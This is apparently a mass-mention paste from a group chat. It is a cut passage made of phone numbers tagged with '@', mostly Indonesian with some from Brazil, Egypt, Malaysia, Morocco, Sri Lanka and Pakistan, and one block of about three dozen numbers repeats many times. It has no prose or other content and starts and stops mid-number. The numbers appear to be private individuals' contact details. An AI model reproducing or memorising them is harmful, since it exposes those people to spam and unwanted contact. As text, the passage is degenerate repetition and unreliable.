17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 